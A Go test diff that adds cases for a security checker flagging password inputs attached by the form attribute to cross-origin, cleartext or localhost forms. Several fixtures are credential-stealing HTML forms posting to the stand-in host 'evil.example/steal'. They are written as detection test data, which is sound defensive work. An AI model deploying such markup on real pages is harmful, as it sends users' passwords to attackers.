@@ -101,3 +101,38 @@ func TestCredentialOffset(t *testing.T) {
 		})
 	}
 }
+
+// form="id"는 문서 어디에 있든 그 폼에 붙는다
+func TestRemoteFormOwner(t *testing.T) {
+	const page = "https://a.com/"
+	cases := []struct {
+		name, html, code string
+		want             int
+	}{
+		{"원격 외부 도메인", `<form id="f" action="https://evil.example/steal"></form><input type=password form="f">`,
+			"cross-origin-password-form", 1},
+		{"원격 평문", `<form id="f" action="http://a.com/login"></form><input type=password form="f">`,
+			"cleartext-credentials", 1},
+		{"원격 로컬", `<form id="f" action="http://127.0.0.1/x"></form><input type=password form="f">`,
+			"local-credential-post", 1},
+		{"비밀번호가 폼보다 먼저", `<input type=password form="f"><form id="f" action="https://evil.example/"></form>`,
+			"cross-origin-password-form", 1},
+		{"원격 버튼의 formaction", `<form id="f" action="/ok"><input type=password></form><button form="f" formaction="https://evil.example/">go</button>`,
+			"cross-origin-password-form", 1},
+		{"같은 id 가 여럿이면 첫 번째", `<form id="f" action="https://evil.example/"></form><form id="f" action="/ok"></form><input type=password form="f">`,
+			"cross-origin-password-form", 1},
+		// 음성
+		{"없는 id 는 주인이 없다", `<input type=password form="nope">`, "cross-origin-password-form", 0},
+		{"같은 도메인", `<form id="f" action="/login"></form><input type=password form="f">`, "cross-origin-password-form", 0},
+		{"속성 없는 폼 밖 비밀번호", `<input type=password>`, "cross-origin-password-form", 0},
+		{"중첩 form 은 id 로 등록되지 않는다", `<form action="/a"><form id="f" action="https://evil.example/"></form></form><input type=password form="f">`,
+			"cross-origin-password-form", 0},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			if got := countCode(c.html, page, c.code); got != c.want {
+				t.Errorf("%s → %d건, want %d건", c.html, got, c.want)
+			}
+		})
+	}
+}
